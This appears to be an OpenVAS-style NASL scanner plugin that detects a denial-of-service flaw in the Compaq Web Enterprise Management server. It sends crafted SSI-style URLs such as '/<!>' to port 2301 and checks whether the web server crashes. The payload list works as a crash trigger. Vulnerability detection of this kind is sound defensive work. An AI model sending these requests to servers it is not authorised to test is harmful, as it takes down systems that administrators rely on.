if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11980" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_name( "Compaq Web SSI DoS" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 2301 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "contact your vendor for a patch,
  or disable this service if you do not use it." );
	script_tag( name: "summary", value: "It was possible to kill the remote web server by requesting
  something like: /<!>

  This is probably a Compaq Web Enterprise Management server." );
	script_tag( name: "impact", value: "An attacker might use this flaw to forbid you from managing your machines." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 2301 );
if(http_is_dead( port: port )){
	exit( 0 );
}
for url in make_list( "/<!>",
	 "/<!.StringRedirecturl>",
	 "/<!.StringHttpRequest=Url>",
	 "/<!.ObjectIsapiECB>",
	 "/<!.StringIsapiECB=lpszPathInfo>" ) {
	s = http_open_socket( port );
	if(!s){
		continue;
	}
	r = http_get( port: port, item: url );
	send( socket: s, data: r );
	http_recv( socket: s );
	http_close_socket( s );
}
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

